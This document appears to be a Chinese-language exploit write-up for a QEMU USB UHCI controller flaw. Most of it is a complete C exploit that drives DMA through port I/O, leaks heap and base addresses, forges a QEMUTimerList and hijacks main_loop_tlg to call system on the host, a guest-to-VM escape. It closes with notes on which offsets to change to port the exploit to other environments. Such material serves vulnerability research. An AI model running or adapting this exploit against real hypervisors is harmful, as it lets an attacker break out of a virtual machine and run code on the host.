这里存在一些问题......有时候mmap出来的空间转为物理地址的时候会出现0x1xxxxxxxx这种地址，导致我们的dma会发生问题，所以可能得多次运行，以避开这种地址。

```c
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <netinet/in.h>

struct UHCI_QH *qh;
struct UHCI_TD *td;
uint32_t *dmabuf;
uint64_t libc_base;
uint64_t fake_timer_list;
char *dmabuf2;
char *setupbuf;
uint64_t system_addr;
typedef struct USBDevice USBDevice;
typedef struct UHCIState UHCIState;
typedef struct USBEndpoint USBEndpoint;

typedef struct UHCI_FL {
    uint32_t fl_pointer;
} UHCI_FL;

typedef struct UHCI_QH {
    uint32_t link;
    uint32_t el_link;
} UHCI_QH;

typedef struct UHCI_TD {
	uint32_t link;
    uint32_t ctrl; /* see TD_CTRL_xxx */
    uint32_t token;
    uint32_t buffer;
} UHCI_TD;

uint32_t pmio_base=0xc040;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

uint32_t pmio_writel(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}

uint8_t pmio_writeb(uint32_t addr, uint8_t value)
{
    outb(value,addr);
}

uint16_t pmio_writew(uint32_t addr, uint16_t value)
{
    outw(value,addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

size_t va2pa(void *addr){
        uint64_t data;

        int fd = open("/proc/self/pagemap",O_RDONLY);
        if(!fd){
                perror("open pagemap");
        return 0;
        }

        size_t pagesize = getpagesize();
        size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

        if(lseek(fd,offset,SEEK_SET) < 0){
                puts("lseek");
                close(fd);
                return 0;
        }

        if(read(fd,&data,8) != 8){
                puts("read");
                close(fd);
                return 0;
		 }

        if(!(data & (((uint64_t)1 << 63)))){
                puts("page");
                close(fd);
                return 0;
        }

        size_t pageframenum = data & ((1ull << 55) - 1);
        size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

        close(fd);

        return phyaddr;
}

void init(){
        if (iopl(3) !=0 )
                die("I/O permission is not enough");
        dmabuf = mmap(0, 0x20000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (dmabuf == MAP_FAILED)
                die("mmap");
        mlock(dmabuf,0x6000);
        qh = dmabuf + 0x1400;
        td = dmabuf + 0x1500;
        setupbuf = dmabuf + 0x1600;
        //*setupbuf = 0x4141414141;
}

void init_state(){
        for(int i = 0; i < 0x400;i++){
                *(dmabuf+i) = va2pa(td);
        }
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0x2d | (7 << 21);
        setupbuf[6] = 0xff;  // setup_len
        setupbuf[7] = 0x0; // setup_len

        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void set_length(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0x2d | (7 << 21);
        setupbuf[0] = in;
        setupbuf[6] = len & 0xff; // setup_len
        setupbuf[7] = (len >> 8) & 0xff; // setup_len
        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void read_data(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0x69 | (len << 21);
        setupbuf[0] = in;
        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void write_data(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0xe1 | (len << 21); // iov_size
        setupbuf[0] = in;

        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void write_fake_setup_index(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0xe1 | (len << 21); // iov_size
        setupbuf[0] = in;
        setupbuf[0x404] = 0x2;
        setupbuf[0x408] = 0x00;
        setupbuf[0x409] = 0x50;
        setupbuf[0x40c] = 0xe8;
        setupbuf[0x40d] = 0xfb;
        setupbuf[0x40e] = 0xff;
        setupbuf[0x40f] = 0xff;
        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void write_fake_setup_index2(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0xe1 | (len << 21); // iov_size
        setupbuf[0] = in;
        for (int i = 8; i < 0x400; i++)
                setupbuf[i]=0x43;
        setupbuf[0x404] = 0x2;
        setupbuf[0x408] = 0x00;
        setupbuf[0x409] = 0x50;
        setupbuf[0x40c] = 0x6C;
        setupbuf[0x40d] = 0x91;
        setupbuf[0x40e] = 0x06;
        setupbuf[0x40f] = 0xFF;
        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void write_fake_setup_index3(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0xe1 | (len << 21); // iov_size
        setupbuf[0] = in;
        for (int i = 8; i < 0x400; i++)
                setupbuf[i]=0x43;
        setupbuf[0x404] = 0x2;
        setupbuf[0x408] = 0x00;
        setupbuf[0x409] = 0x50;
        setupbuf[0x40c] = 0xEC;
        setupbuf[0x40d] = 0xC0;
        setupbuf[0x40e] = 0x08;
        setupbuf[0x40f] = 0xFF;
        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void write_fake_qemutimer(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0xe1 | (len << 21); // iov_size
        memset(setupbuf,0,0x400);
        setupbuf[0] = in;
        *(uint64_t *)(setupbuf) = libc_base + 0x1231D10;
        *(uint64_t *)(setupbuf + 0x38) = 0x0000000100000000;
        *(uint64_t *)(setupbuf + 0x40) = fake_timer_list + 0x70;
        *(uint64_t *)(setupbuf + 0x48) = 0;
        *(uint64_t *)(setupbuf + 0x50) = 0;
        *(uint64_t *)(setupbuf + 0x58) = libc_base + 0x319EA4;
        *(uint64_t *)(setupbuf + 0x60) = 0;
        *(uint64_t *)(setupbuf + 0x68) = 0x0000000100000000;

        *(uint64_t *)(setupbuf + 0x70) = 0;
        *(uint64_t *)(setupbuf + 0x78) = fake_timer_list;
        *(uint64_t *)(setupbuf + 0x80) = system_addr;
        *(uint64_t *)(setupbuf + 0x88) = fake_timer_list + 0xa0;
        *(uint64_t *)(setupbuf + 0x90) = 0;
        *(uint64_t *)(setupbuf + 0x98) = 0x000f424000000000;

    	*(uint64_t *)(setupbuf + 0xa0) = 0x636c616378;
        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void write_fake_main_loop_tlg(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0xe1 | (len << 21); // iov_size
        setupbuf[0] = in;
        memset(setupbuf,0,0x400);
        *(uint64_t *)(setupbuf) = fake_timer_list;
        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

void write_fake_setup_buf(uint16_t len,uint8_t in){
        td->buffer = va2pa(dmabuf+0x1600);
        td->link = NULL;
        td->ctrl = 1 << 23;
        td->token = 0xe1 | (len << 21); // iov_size
        memset(setupbuf,0,0x500);
        setupbuf[0] = in; // fake_setupbuf[0]
        pmio_writeb(pmio_base,2);
        pmio_writel(pmio_base+0x8,va2pa(dmabuf));
        pmio_writeb(pmio_base,1);
        pmio_writew(pmio_base+0x10,4);
}

int main(int argc, char *argv[])
{

        init();
        usleep(1000);
        int *phy = va2pa(dmabuf);
        init_state();
        usleep(10000);
        printf("this is pht:%p\n",phy);
        puts("now,set s->setup_len = 0x5000");
        set_length(0x5000,0);
        usleep(10000);

        // fake_data,set s->setup_index = -8
        for (int i = 0; i <= 2; i++){
                write_data(0x3ff,0);
                usleep(10000);
        }
        puts("write_fake_setup_index = -8");
        write_fake_setup_index(0x40f,0);
        usleep(10000);
		
    	// fake_data,set s->setup_buf[0] = 0x80
        puts("fake_data,set s->setup_buf[0] = 0x80");
        write_fake_setup_buf(0x7,0x80);
        usleep(10000);

        // leak text(libc_base)
        for (int i = 0; i <= 3; i++){
                read_data(0x400,0x80);
                usleep(10000);
        }
        read_data(0x4f,0x80);
        sleep(1);
        uint64_t *data_buf = setupbuf;
        uint64_t usbdevice = data_buf[4];
        printf("this is usbdevice:\t\t%p\n",usbdevice);
        uint64_t s_data_buf = usbdevice + 0xe4;
        printf("this is s_data_buf:\t\t%p\n",s_data_buf);
        fake_timer_list = s_data_buf + 0x15DC;
    	
    	// leak uhcistate_addr
        read_data(0x5ff,0x80);
        usleep(10000);
        read_data(0x18f,0x80);
        usleep(10000);
        uint64_t usb_hid_changed_addr = data_buf[21];
        if (usb_hid_changed_addr == 0){
                printf("usb_hid_changed_addr error\n");
                exit(-1);
        }
    
    	uint64_t range_heap_addr = data_buf[22];
        if (range_heap_addr == 0){
                printf("range_heap_addr error\n");
                exit(-1);
        }

        uint64_t heap_base_addr = range_heap_addr - 0xF9A340;

        printf("this is range_heap_addr:\t%p\n",range_heap_addr);
        printf("this is heap_base_addr:\t\t%p\n",heap_base_addr);
        printf("this is usb_hid_changed_addr:\t%p\n",usb_hid_changed_addr);

        sleep(1);

        uint64_t uhcistate_ports_addr = heap_base_addr + 0xE8CCE8;
        printf("leak_uhcistate_ports_addr:\t%p\n",uhcistate_ports_addr);
        libc_base = usb_hid_changed_addr - 0x683658;
        system_addr = libc_base + 0x2C1578;
        printf("this is libc_base:\t\t%p\n",libc_base);
        printf("this is system_addr:\t\t%p\n",system_addr);

        uint64_t main_loop_tlg_addr = uhcistate_ports_addr - 0xE68008;
    
    	// fake_timer_list
        init_state();
        usleep(10000);
        puts("now,set s->setup_len = 0x5000");

        set_length(0x5000,0);
        usleep(10000);

        for (int i = 0; i <= 2; i++){
                printf("this is no.%p write\n",i);
                write_data(0x3ff,0);
                usleep(10000);
        }
        write_fake_setup_index2(0x40f,0);
        usleep(10000);
        puts("write_fake_qemutimer");
        write_fake_qemutimer(0x147,0);
        usleep(10000);

    	// fake main_loop_tlg
        init_state();
        usleep(1000);
        puts("now,set s->setup_len = 0x5000");
        set_length(0x5000,0);
        usleep(10000);
        for (int i = 0; i <= 2; i++){
                printf("this is no.%p write\n",i);
                write_data(0x3ff,0);
                usleep(10000);
        }
        puts("write_fake_setup_index = 0xFF08c14c");
        write_fake_setup_index3(0x40f,0);
        usleep(10000);

        puts("fake_main_loop_tlg");
        write_fake_main_loop_tlg(0x8,0);
        usleep(10000);
    
    	read_data(0x3ff,0x80);
        return 0;

}

```

如果要改变环境的话，exp可能要进行改动的几个点

+ 堆基址（有可能）

  因为堆基址是根据我们获取的usbdevice来的，如果环境发生变化，堆块的布局也可以产生变化，这里需要注意一下。

  ```c
  uint64_t heap_base_addr = usbdevice - 0xFB2310;
  ```

+ 程序基址（有可能）

  至少我从16换到20的时候，虽然16是gdb --args启动的，导致了偏移的变化，这里可能需要进行检查

  ```c
  libc_base = usb_hid_changed_addr - 0x6BD110;
  ```

+ system@plt偏移（一定）

  不同的gcc版本编译会导致程序的总体布局不一致，这里拿不到binary的话，我个人是没有办法操作。

  ```c
  system_addr = libc_base + 0x2CFF74;
  ```

+ 在bss段的全局变量main_loop_tlg

  这个是根据程序基址来计算的，这里环境变化了可能也需要重新计算

  ```c
  uint64_t main_loop_tlg_addr = libc_base + 0x10A1A80;
  ```

+ 储存伪造的QEMUTimerList的堆块（至少我变化了）

  可能堆块的内容会发生变化，存储的地方有作其他用途，从而导致内存被破坏

  ```c
  write_fake_setup_index2 // 该函数被我设定成指向存储伪造QEMUTimerList的堆块
  fake_timer_list = s_data_buf - 0xF931F4; // 这里就是指向伪造的堆块
  // 同样，QEMUTimerList结构体中的clock和qemu_timer_notify_cb两个变量的偏移也会发生变化，需要修改
  void write_fake_qemutimer(uint16_t len,uint8_t in){
      ......
  	    *(uint64_t *)(setupbuf) = libc_base + 0x10A1AB0; // clock
          *(uint64_t *)(setupbuf + 0x38) = 0x0000000100000000;
          *(uint64_t *)(setupbuf + 0x40) = fake_timer_list + 0x70;
          *(uint64_t *)(setupbuf + 0x48) = 0;
          *(uint64_t *)(setupbuf + 0x50) = 0;
          *(uint64_t *)(setupbuf + 0x58) = libc_base + 0x3294CB; // qemu_timer_notify_cb
      ......
  }
  ```

  